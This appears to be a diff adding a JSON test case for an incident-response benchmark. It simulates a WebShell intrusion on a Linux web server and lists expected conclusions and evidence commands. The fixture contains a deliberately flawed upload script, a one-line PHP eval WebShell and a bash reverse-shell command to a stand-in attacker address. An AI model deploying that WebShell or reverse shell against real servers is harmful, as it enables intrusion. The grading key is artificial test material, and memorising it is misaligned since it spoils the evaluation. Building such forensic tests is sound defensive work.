@@ -1,0 +1,203 @@
+{
+  "id": "webshell-typical",
+  "title": "典型 WebShell 入侵（完整证据链）",
+  "category": "positive",
+  "investigation_mode": "alarm_driven",
+  "alarm": {
+    "source": "云安全中心",
+    "id": "88010001",
+    "name": "网站后门-WebShell 通信",
+    "time": "2026-04-17T14:03:00+08:00",
+    "asset_uuid": "0a1b2c3d-4e5f-6071-8293-a4b5c6d7e8f9"
+  },
+  "clients": [
+    {
+      "id": "1",
+      "os": "linux/amd64",
+      "address": "203.0.113.10:41022",
+      "note": "web01",
+      "online": true,
+      "host": {
+        "hostname": "web01",
+        "now": "2026-04-17T15:00:00+08:00",
+        "timezone": "Asia/Shanghai",
+        "timezone_name": "CST",
+        "uname": "Linux web01 3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux",
+        "uptime": " 15:00:01 up 41 days,  2:11,  1 user,  load average: 0.31, 0.28, 0.24",
+        "id": "uid=0(root) gid=0(root) groups=0(root)",
+        "wtmp_begins": "Mon Mar 30 03:12:01 2026",
+        "files": [
+          {
+            "path": "/var/www/html/upload.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2025-11-02T10:14:52+08:00",
+            "ctime": "2025-11-02T10:14:52+08:00",
+            "atime": "2026-04-17T13:58:41+08:00",
+            "md5": "6c1f0e2a8d3b47f59a02c7e1b4d6a913",
+            "lines": [
+              "<?php",
+              "// legacy image upload endpoint, extension check only",
+              "$name = $_FILES['f']['name'];",
+              "if (!preg_match('/\\\\.(jpg|png|gif)$/i', $name)) { move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/'.$name); }",
+              "?>"
+            ]
+          },
+          {
+            "path": "/var/www/html/uploads/s.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mode": "-rw-r--r--",
+            "mtime": "2026-04-17T13:58:41+08:00",
+            "ctime": "2026-04-17T13:58:41+08:00",
+            "atime": "2026-04-17T14:32:05+08:00",
+            "md5": "d41d8ce1f00b204e9800998ecf8427ab",
+            "file_type": "PHP script, ASCII text",
+            "lines": [
+              "<?php @eval($_POST['pass']); ?>"
+            ]
+          },
+          {
+            "path": "/var/www/html/uploads/logo-2024.png",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2025-12-19T16:03:11+08:00",
+            "ctime": "2025-12-19T16:03:11+08:00",
+            "atime": "2026-04-16T08:20:00+08:00",
+            "size": 21504,
+            "file_type": "PNG image data, 512 x 512"
+          },
+          {
+            "path": "/var/log/nginx/access.log",
+            "user": "root",
+            "mtime": "2026-04-17T14:59:10+08:00",
+            "lines": [
+              "10.0.0.9 - - [17/Apr/2026:13:40:02 +0800] \"GET /index.php HTTP/1.1\" 200 8241 \"-\" \"Mozilla/5.0\"",
+              "10.0.0.9 - - [17/Apr/2026:13:52:44 +0800] \"GET /product/list HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0\"",
+              "203.0.113.45 - - [17/Apr/2026:13:57:59 +0800] \"GET /upload.php HTTP/1.1\" 200 412 \"-\" \"python-requests/2.31.0\"",
+              "203.0.113.45 - - [17/Apr/2026:13:58:41 +0800] \"POST /upload.php HTTP/1.1\" 200 31 \"-\" \"python-requests/2.31.0\"",
+              "203.0.113.45 - - [17/Apr/2026:13:59:12 +0800] \"POST /uploads/s.php HTTP/1.1\" 200 146 \"-\" \"python-requests/2.31.0\"",
+              "203.0.113.45 - - [17/Apr/2026:14:00:37 +0800] \"POST /uploads/s.php HTTP/1.1\" 200 2210 \"-\" \"python-requests/2.31.0\"",
+              "203.0.113.45 - - [17/Apr/2026:14:01:02 +0800] \"POST /uploads/s.php HTTP/1.1\" 200 12 \"-\" \"python-requests/2.31.0\"",
+              "10.0.0.9 - - [17/Apr/2026:14:11:30 +0800] \"GET /index.php HTTP/1.1\" 200 8241 \"-\" \"Mozilla/5.0\""
+            ]
+          },
+          {
+            "path": "/var/spool/cron/root",
+            "user": "root",
+            "mtime": "2025-08-11T09:00:00+08:00",
+            "ctime": "2025-08-11T09:00:00+08:00",
+            "lines": [
+              "0 3 * * * /usr/local/bin/backup.sh >/dev/null 2>&1"
+            ]
+          },
+          {
+            "path": "/root/.ssh/authorized_keys",
+            "user": "root",
+            "mode": "-rw-------",
+            "mtime": "2025-07-01T11:20:00+08:00",
+            "ctime": "2025-07-01T11:20:00+08:00",
+            "lines": [
+              "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOpsKeyForOpsTeam ops@bastion"
+            ]
+          }
+        ],
+        "processes": [
+          {"pid": 1, "ppid": 0, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 191216, "rss": 4088, "stat": "Ss", "start": "Mar30", "time": "3:21", "cmd": "/usr/lib/systemd/systemd --switched-root --system"},
+          {"pid": 892, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 112904, "rss": 4296, "stat": "Ss", "start": "Mar30", "time": "0:02", "cmd": "/usr/sbin/sshd -D"},
+          {"pid": 918, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.2, "vsz": 125412, "rss": 6120, "stat": "Ss", "start": "Mar30", "time": "0:44", "cmd": "nginx: master process /usr/sbin/nginx"},
+          {"pid": 1120, "ppid": 918, "user": "www-data", "cpu": 0.3, "mem": 0.4, "vsz": 126004, "rss": 9840, "stat": "S", "start": "Mar30", "time": "2:07", "cmd": "nginx: worker process"},
+          {"pid": 2311, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.6, "vsz": 402180, "rss": 22140, "stat": "Ss", "start": "Mar30", "time": "0:31", "cmd": "php-fpm: master process (/etc/php-fpm.conf)"},
+          {"pid": 2418, "ppid": 2311, "user": "www-data", "cpu": 1.2, "mem": 0.9, "vsz": 411904, "rss": 31288, "stat": "S", "start": "Mar30", "time": "1:12", "cmd": "php-fpm: pool www"},
+          {"pid": 2571, "ppid": 2418, "user": "www-data", "cpu": 0.1, "mem": 0.1, "vsz": 115516, "rss": 2244, "stat": "S", "start": "13:59", "time": "0:00", "cmd": "bash -i >& /dev/tcp/203.0.113.45/8443 0>&1"}
+        ],
+        "connections": [
+          {"proto": "tcp", "local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 892, "program": "sshd"},
+          {"proto": "tcp", "local": "0.0.0.0:80", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 918, "program": "nginx"},
+          {"proto": "tcp", "local": "127.0.0.1:9000", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 2311, "program": "php-fpm"},
+          {"proto": "tcp", "local": "10.0.1.11:39804", "remote": "203.0.113.45:8443", "state": "ESTABLISHED", "pid": 2571, "program": "bash"}
+        ],
+        "logins": [
+          {"user": "ops", "tty": "pts/0", "from": "10.0.0.9", "start": "Fri Apr 17 09:02", "end": "09:41", "duration": "00:39"},
+          {"user": "ops", "tty": "pts/0", "from": "10.0.0.9", "start": "Thu Apr 16 10:15", "end": "11:02", "duration": "00:47"}
+        ],
+        "failed_logins": [],
+        "crontabs": {
+          "root": ["0 3 * * * /usr/local/bin/backup.sh >/dev/null 2>&1"],
+          "www-data": []
+        },
+        "journal": [
+          {"ts": "2026-04-17T13:59:12+08:00", "unit": "php-fpm[2418]", "message": "pool www: child 2571 started"},
+          {"ts": "2026-04-17T14:03:00+08:00", "unit": "aliyun-service[1502]", "message": "security scan finished on /var/www/html"}
+        ],
+        "journal_begins": "2026-03-30 03:12:04",
+        "package_verify": [],
+        "systemd_units": [
+          {"name": "nginx.service", "description": "The nginx HTTP and reverse proxy server", "active": "active", "sub": "running", "main_pid": 918, "exec": "nginx", "since": "Mon 2026-03-30 03:12:22 CST", "path": "/usr/lib/systemd/system/nginx.service"}
+        ]
+      }
+    }
+  ],
+  "faults": [],
+  "expectation": {
+    "verdict": "confirmed_intrusion",
+    "confidence_ceiling": "confirmed",
+    "must_conclude": [
+      "攻击者 203.0.113.45 通过 /upload.php 上传 WebShell /var/www/html/uploads/s.php（13:58:41）",
+      "WebShell 被实际调用：13:59:12 起有三次 POST /uploads/s.php 且返回 200",
+      "php-fpm 派生出 PID 2571 的反弹 shell，与 203.0.113.45:8443 保持 ESTABLISHED",
+      "ATT&CK 至少覆盖 T1190、T1505.003、T1059.004、T1071.001",
+      "未发现 cron / authorized_keys 持久化，残留风险按「未观察到」表述"
+    ],
+    "must_not_conclude": [
+      "把 s.php 的 atime 14:32:05 说成攻击者访问时间（那是云安全中心扫描）",
+      "断言数据已被批量外传（无外传体量证据）",
+      "断言攻击者取得了 root（进程属主是 www-data）"
+    ],
+    "required_evidence": [
+      {
+        "client": "1",
+        "command": "grep -n 'POST /upload.php' /var/log/nginx/access.log",
+        "must_contain": ["203.0.113.45", "13:58:41", "200"]
+      },
+      {
+        "client": "1",
+        "command": "stat /var/www/html/uploads/s.php",
+        "must_contain": ["Modify: 2026-04-17 13:58:41", "Change: 2026-04-17 13:58:41", "Access: 2026-04-17 14:32:05"]
+      },
+      {
+        "client": "1",
+        "command": "cat /var/www/html/uploads/s.php",
+        "must_contain": ["eval", "$_POST"]
+      },
+      {
+        "client": "1",
+        "command": "grep -c 'POST /uploads/s.php' /var/log/nginx/access.log",
+        "must_contain": ["3"]
+      },
+      {
+        "client": "1",
+        "command": "ps aux",
+        "must_contain": ["/dev/tcp/203.0.113.45/8443", "php-fpm: pool www"]
+      },
+      {
+        "client": "1",
+        "command": "netstat -antp",
+        "must_contain": ["203.0.113.45:8443", "ESTABLISHED", "2571/bash"]
+      },
+      {
+        "client": "1",
+        "command": "crontab -l",
+        "must_contain": ["backup.sh"],
+        "must_not_contain": ["203.0.113.45"]
+      }
+    ],
+    "notes": "正例基线：入口、执行、外联三类证据齐备且互相印证，结论可以用「已确认」措辞。它同时是回归锚点——如果连这个场景都得不出确定结论，说明判读过严。"
+  }
+}
